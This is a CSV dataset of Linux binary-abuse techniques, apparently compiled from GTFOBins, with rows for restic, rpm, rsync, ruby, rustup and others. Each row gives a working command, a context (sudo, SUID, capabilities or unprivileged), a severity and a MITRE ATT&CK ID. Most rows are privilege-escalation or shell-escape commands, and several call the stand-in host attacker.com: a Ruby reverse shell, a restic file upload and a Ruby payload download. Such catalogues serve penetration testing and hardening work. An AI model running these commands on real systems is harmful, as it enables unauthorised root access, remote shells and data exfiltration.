1444,Linux,redcarpet /path/to/input-file,Abuse the 'redcarpet' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is actually parsed as a Markdown file.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/redcarpet/
1445,Linux,redcarpet /path/to/input-file,Abuse the 'redcarpet' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is actually parsed as a Markdown file.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/redcarpet/
1446,Linux,"redis-cli -h 127.0.0.1 config set dir /path/to/output-dir/ config set dbfilename output-file set x ""DATA"" save",Abuse the 'redis' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. Write files on the server running Redis at the specified location. Written data will appear amongst the database dump. Keep in mind that it's actually the server to perform the file write.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/redis/
1447,Linux,"redis-cli -h 127.0.0.1 config set dir /path/to/output-dir/ config set dbfilename output-file set x ""DATA"" save",Abuse the 'redis' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. Write files on the server running Redis at the specified location. Written data will appear amongst the database dump. Keep in mind that it's actually the server to perform the file write.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/redis/
1448,Linux,"redis-cli -h 127.0.0.1 config set dir /path/to/output-dir/ config set dbfilename output-file set x ""DATA"" save",Abuse the 'redis' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. Write files on the server running Redis at the specified location. Written data will appear amongst the database dump. Keep in mind that it's actually the server to perform the file write.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/redis/
1449,Linux,RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup,Abuse the 'restic' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/restic/
1450,Linux,RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup,Abuse the 'restic' binary (command) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/restic/
1451,Linux,RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup,Abuse the 'restic' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/restic/
1452,Linux,restic --password-command='/path/to/command' backup,Abuse the 'restic' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/restic/
1453,Linux,restic --password-command='/path/to/command' backup,Abuse the 'restic' binary (command) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/restic/
1454,Linux,restic --password-command='/path/to/command' backup,Abuse the 'restic' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/restic/
1455,Linux,"RESTIC_PASSWORD_COMMAND='/bin/sh -c ""/bin/sh 0<&2 1<&2""' restic backup",Abuse the 'restic' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/restic/
1456,Linux,"RESTIC_PASSWORD_COMMAND='/bin/sh -p -c ""/bin/sh -p 0<&2 1<&2""' restic backup",Abuse the 'restic' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/restic/
1457,Linux,"RESTIC_PASSWORD_COMMAND='/bin/sh -c ""/bin/sh 0<&2 1<&2""' restic backup",Abuse the 'restic' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/restic/
1458,Linux,"restic --password-command='/bin/sh -c ""/bin/sh 0<&2 1<&2""' backup",Abuse the 'restic' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/restic/
1459,Linux,"restic --password-command='/bin/sh -p -c ""/bin/sh -p 0<&2 1<&2""' backup",Abuse the 'restic' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/restic/
1460,Linux,"restic --password-command='/bin/sh -c ""/bin/sh 0<&2 1<&2""' backup",Abuse the 'restic' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/restic/
1461,Linux,restic backup -r rest:http://attacker.com:12345/x /path/to/input-file,Abuse the 'restic' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/restic/
1462,Linux,restic backup -r rest:http://attacker.com:12345/x /path/to/input-file,Abuse the 'restic' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/restic/
1463,Linux,restic backup -r rest:http://attacker.com:12345/x /path/to/input-file,Abuse the 'restic' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/restic/
1464,Linux,rev /path/to/input-file | rev,Abuse the 'rev' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/rev/
1465,Linux,rev /path/to/input-file | rev,Abuse the 'rev' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/rev/
1466,Linux,rev /path/to/input-file | rev,Abuse the 'rev' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/rev/
1467,Linux,rlogin -l DATA -p 12345 attacker.com,Abuse the 'rlogin' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions. The file is corrupted by leading and trailing spurious data.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/rlogin/
1468,Linux,rlogin -l DATA -p 12345 attacker.com,Abuse the 'rlogin' binary (upload) in a suid context to escalate privileges or execute arbitrary actions. The file is corrupted by leading and trailing spurious data.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/rlogin/
1469,Linux,rlogin -l DATA -p 12345 attacker.com,Abuse the 'rlogin' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is corrupted by leading and trailing spurious data.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/rlogin/
1470,Linux,rlwrap -l /path/to/output-file echo DATA,Abuse the 'rlwrap' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. This adds timestamps to the output file. This relies on the external `echo` command.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/rlwrap/
1471,Linux,rlwrap -l /path/to/output-file echo DATA,Abuse the 'rlwrap' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. This adds timestamps to the output file. This relies on the external `echo` command.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/rlwrap/
1472,Linux,rlwrap -l /path/to/output-file echo DATA,Abuse the 'rlwrap' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. This adds timestamps to the output file. This relies on the external `echo` command.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/rlwrap/
1473,Linux,rlwrap /bin/sh,Abuse the 'rlwrap' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/rlwrap/
1474,Linux,rlwrap /bin/sh -p,Abuse the 'rlwrap' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/rlwrap/
1475,Linux,rlwrap /bin/sh,Abuse the 'rlwrap' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/rlwrap/
1476,Linux,rpm -ivh x-1.0-1.noarch.rpm,Abuse the 'rpm' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` echo /path/to/command >x.sh fpm -n x -s dir -t rpm -a all --before-install x.sh . ```,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/rpm/
1477,Linux,rpm --eval '%{lua:...}',Abuse the 'rpm' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/rpm/
1478,Linux,rpm --eval '%{lua:...}',Abuse the 'rpm' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/rpm/
1479,Linux,rpm --eval '%{lua:...}',Abuse the 'rpm' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/rpm/
1480,Linux,rpm --eval '%(/bin/sh 1>&2)',Abuse the 'rpm' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/rpm/
1481,Linux,rpm --eval '%(/bin/sh 1>&2)',Abuse the 'rpm' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/rpm/
1482,Linux,rpm --eval '%(/bin/sh 1>&2)',Abuse the 'rpm' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/rpm/
1483,Linux,rpm --pipe '/bin/sh 0<&1',Abuse the 'rpm' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/rpm/
1484,Linux,rpm --pipe '/bin/sh 0<&1',Abuse the 'rpm' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/rpm/
1485,Linux,rpm --pipe '/bin/sh 0<&1',Abuse the 'rpm' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/rpm/
1486,Linux,rpmdb --eval '%{lua:...}',Abuse the 'rpmdb' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/rpmdb/
1487,Linux,rpmdb --eval '%{lua:...}',Abuse the 'rpmdb' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/rpmdb/
1488,Linux,rpmdb --eval '%{lua:...}',Abuse the 'rpmdb' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/rpmdb/
1489,Linux,rpmdb --eval '%(/bin/sh 1>&2)',Abuse the 'rpmdb' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/rpmdb/
1490,Linux,rpmdb --eval '%(/bin/sh 1>&2)',Abuse the 'rpmdb' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/rpmdb/
1491,Linux,rpmdb --eval '%(/bin/sh 1>&2)',Abuse the 'rpmdb' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/rpmdb/
1492,Linux,rpmquery --eval '%{lua:...}',Abuse the 'rpmquery' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/rpmquery/
1493,Linux,rpmquery --eval '%{lua:...}',Abuse the 'rpmquery' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/rpmquery/
1494,Linux,rpmquery --eval '%{lua:...}',Abuse the 'rpmquery' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/rpmquery/
1495,Linux,rpmquery --eval '%(/bin/sh 1>&2)',Abuse the 'rpmquery' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/rpmquery/
1496,Linux,rpmquery --eval '%(/bin/sh 1>&2)',Abuse the 'rpmquery' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/rpmquery/
1497,Linux,rpmquery --eval '%(/bin/sh 1>&2)',Abuse the 'rpmquery' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/rpmquery/
1498,Linux,rpmverify --eval '%{lua:...}',Abuse the 'rpmverify' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/rpmverify/
1499,Linux,rpmverify --eval '%{lua:...}',Abuse the 'rpmverify' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/rpmverify/
1500,Linux,rpmverify --eval '%{lua:...}',Abuse the 'rpmverify' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Lua code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/rpmverify/
1501,Linux,rpmverify --eval '%(/bin/sh 1>&2)',Abuse the 'rpmverify' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/rpmverify/
1502,Linux,rpmverify --eval '%(/bin/sh 1>&2)',Abuse the 'rpmverify' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/rpmverify/
1503,Linux,rpmverify --eval '%(/bin/sh 1>&2)',Abuse the 'rpmverify' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/rpmverify/
1504,Linux,"rsync -e '/bin/sh -c ""/bin/sh 0<&2 1>&2""' x:x",Abuse the 'rsync' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/rsync/
1505,Linux,"rsync -e '/bin/sh -p -c ""/bin/sh -p 0<&2 1>&2""' x:x",Abuse the 'rsync' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/rsync/
1506,Linux,"rsync -e '/bin/sh -c ""/bin/sh 0<&2 1>&2""' x:x",Abuse the 'rsync' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/rsync/
1507,Linux,"cat >/path/to/temp-file <<EOF module(load=""imuxsock"") :msg, contains, ""somerandomstring"" ^/path/to/command EOF rsyslogd -f /path/to/temp-file","Abuse the 'rsyslogd' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. In order for this to work, one must be able to trigger one event containing the chosen string, e.g., `somerandomstring`. One possibility is to attempt to connect to the victim host via SSH, for example: ``` ssh somerandomstring@victim.com ```",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/rsyslogd/
1508,Linux,"echo 'execute = /bin/sh,-c,""/bin/sh </dev/tty >/dev/tty 2>/dev/tty""' >~/.rtorrent.rc rtorrent","Abuse the 'rtorrent' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. After the shell, exit with `Ctrl-Q`.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/rtorrent/
1509,Linux,"echo 'execute = /bin/sh,-p,-c,""/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty""' >~/.rtorrent.rc rtorrent","Abuse the 'rtorrent' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. After the shell, exit with `Ctrl-Q`.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/rtorrent/
1510,Linux,"echo 'execute = /bin/sh,-c,""/bin/sh </dev/tty >/dev/tty 2>/dev/tty""' >~/.rtorrent.rc rtorrent","Abuse the 'rtorrent' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. After the shell, exit with `Ctrl-Q`.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/rtorrent/
1511,Linux,"ruby -e 'require ""open-uri""; download = URI.open(""http://attacker.com/path/to/input-file""); IO.copy_stream(download, ""/path/to/output-file"")'",Abuse the 'ruby' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ruby/
1512,Linux,"ruby -e 'require ""open-uri""; download = URI.open(""http://attacker.com/path/to/input-file""); IO.copy_stream(download, ""/path/to/output-file"")'",Abuse the 'ruby' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/ruby/
1513,Linux,"ruby -e 'puts File.read(""/path/to/input-file"")'",Abuse the 'ruby' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ruby/
1514,Linux,"ruby -e 'puts File.read(""/path/to/input-file"")'",Abuse the 'ruby' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/ruby/
1515,Linux,"ruby -e 'File.open(""/path/to/output-file"", ""w+"") { |f| f.write(""DATA"") }'",Abuse the 'ruby' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/ruby/
1516,Linux,"ruby -e 'File.open(""/path/to/output-file"", ""w+"") { |f| f.write(""DATA"") }'",Abuse the 'ruby' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/ruby/
1517,Linux,"ruby -e 'require ""fiddle""; Fiddle.dlopen(""/path/to/lib.so"")'",Abuse the 'ruby' binary (library load) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/ruby/
1518,Linux,"ruby -e 'require ""fiddle""; Fiddle.dlopen(""/path/to/lib.so"")'",Abuse the 'ruby' binary (library load) in a unprivileged context to escalate privileges or execute arbitrary actions.,Library Load Hijack,Medium,T1574.006,https://gtfobins.github.io/gtfobins/ruby/
1519,Linux,"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(""attacker.com"",12345);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read}end'",Abuse the 'ruby' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ruby/
1520,Linux,"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(""attacker.com"",12345);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read}end'",Abuse the 'ruby' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/ruby/
1521,Linux,"ruby -e 'Process::Sys.setuid(0); exec ""/bin/sh""'",Abuse the 'ruby' binary (shell) in a capabilities context to escalate privileges or execute arbitrary actions.,Capabilities Abuse,Critical,T1548.001,https://gtfobins.github.io/gtfobins/ruby/
1522,Linux,"ruby -e 'exec ""/bin/sh""'",Abuse the 'ruby' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ruby/
1523,Linux,"ruby -e 'exec ""/bin/sh""'",Abuse the 'ruby' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ruby/
1524,Linux,ruby -run -e httpd . -p 80,Abuse the 'ruby' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/ruby/
1525,Linux,ruby -run -e httpd . -p 80,Abuse the 'ruby' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/ruby/
1526,Linux,run-mailcap --action=view text/plain:/etc/hosts,Abuse the 'run-mailcap' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/run-mailcap/
1527,Linux,run-mailcap --action=view text/plain:/etc/hosts,Abuse the 'run-mailcap' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/run-mailcap/
1528,Linux,run-mailcap --action=edit text/plain:/path/to/output-file,Abuse the 'run-mailcap' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. The file must exist and be not empty.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/run-mailcap/
1529,Linux,run-mailcap --action=edit text/plain:/path/to/output-file,Abuse the 'run-mailcap' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. The file must exist and be not empty.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/run-mailcap/
1530,Linux,run-parts --new-session --regex '^sh$' /bin,Abuse the 'run-parts' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/run-parts/
1531,Linux,run-parts --new-session --regex '^sh$' /bin --arg='-p',Abuse the 'run-parts' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/run-parts/
1532,Linux,run-parts --new-session --regex '^sh$' /bin,Abuse the 'run-parts' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/run-parts/
1533,Linux,cp /bin/sh /path/to/temp-dir/ run-parts /path/to/temp-dir/,Abuse the 'run-parts' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/run-parts/
1534,Linux,cp /bin/sh /path/to/temp-dir/ run-parts /path/to/temp-dir/ --arg='-p',Abuse the 'run-parts' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/run-parts/
1535,Linux,cp /bin/sh /path/to/temp-dir/ run-parts /path/to/temp-dir/,Abuse the 'run-parts' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/run-parts/
1536,Linux,echo '! exec /bin/sh' >/path/to/temp-file runscript /path/to/temp-file,Abuse the 'runscript' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/runscript/
1537,Linux,echo '! exec /bin/sh' >/path/to/temp-file runscript /path/to/temp-file,Abuse the 'runscript' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/runscript/
1538,Linux,echo '! exec /bin/sh' >/path/to/temp-file runscript /path/to/temp-file,Abuse the 'runscript' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/runscript/
1539,Linux,rustc /path/to/input-file,Abuse the 'rustc' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The compiler leaks some file lines in the compiler error.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/rustc/
1540,Linux,rustc /path/to/input-file,Abuse the 'rustc' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The compiler leaks some file lines in the compiler error.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/rustc/
1541,Linux,"echo 'fn main() { println!(""DATA""); }' >/path/to/temp-file rustc /path/to/temp-file -o /path/to/output-file",Abuse the 'rustc' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The comment appears in the compiled program.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/rustc/
1542,Linux,"echo 'fn main() { println!(""DATA""); }' >/path/to/temp-file rustc /path/to/temp-file -o /path/to/output-file",Abuse the 'rustc' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The comment appears in the compiled program.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/rustc/
1543,Linux,rustc --explain E0001,Abuse the 'rustc' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/rustc/
1544,Linux,rustc --explain E0001,Abuse the 'rustc' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/rustc/
1545,Linux,rustdoc /path/to/input-file,Abuse the 'rustdoc' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Partial content is displayed as error messages.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/rustdoc/
1546,Linux,rustdoc /path/to/input-file,Abuse the 'rustdoc' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Partial content is displayed as error messages.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/rustdoc/
1547,Linux,echo '//! DATA' >/path/to/temp-file rustdoc /path/to/temp-file -o /path/to/output-dir/,"Abuse the 'rustdoc' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. This command creates a number of documentation files in the target directory, and the data is written in multiple locations, e.g., `src/temp_file/temp-file.html`, amidst other content.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/rustdoc/
1548,Linux,echo '//! DATA' >/path/to/temp-file rustdoc /path/to/temp-file -o /path/to/output-dir/,"Abuse the 'rustdoc' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. This command creates a number of documentation files in the target directory, and the data is written in multiple locations, e.g., `src/temp_file/temp-file.html`, amidst other content.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/rustdoc/
1549,Linux,rustfmt /path/to/input-file,Abuse the 'rustfmt' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Partial content is displayed as error messages.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/rustfmt/
1550,Linux,rustfmt /path/to/input-file,Abuse the 'rustfmt' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Partial content is displayed as error messages.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/rustfmt/
1551,Linux,mkdir /path/to/temp-dir/bin/ mkdir /path/to/temp-dir/lib/ echo '/path/to/command' >/path/to/temp-dir/bin/rustc chmod +x /path/to/temp-dir/bin/rustc rustup toolchain link x /path/to/temp-dir/ rustup run x rustc,Abuse the 'rustup' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/rustup/
1552,Linux,mkdir /path/to/temp-dir/bin/ mkdir /path/to/temp-dir/lib/ echo '/path/to/command' >/path/to/temp-dir/bin/rustc chmod +x /path/to/temp-dir/bin/rustc rustup toolchain link x /path/to/temp-dir/ rustup run x rustc,Abuse the 'rustup' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/rustup/
1553,Linux,mkdir /path/to/temp-dir/bin/ mkdir /path/to/temp-dir/lib/ cp /bin/sh /path/to/temp-dir/bin/rustc rustup toolchain link x /path/to/temp-dir/ rustup run x rustc,Abuse the 'rustup' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/rustup/
1554,Linux,mkdir /path/to/temp-dir/bin/ mkdir /path/to/temp-dir/lib/ cp /bin/sh /path/to/temp-dir/bin/rustc rustup toolchain link x /path/to/temp-dir/ rustup run x rustc,Abuse the 'rustup' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/rustup/
1555,Linux,sash,Abuse the 'sash' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/sash/
1556,Linux,sash,Abuse the 'sash' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/sash/
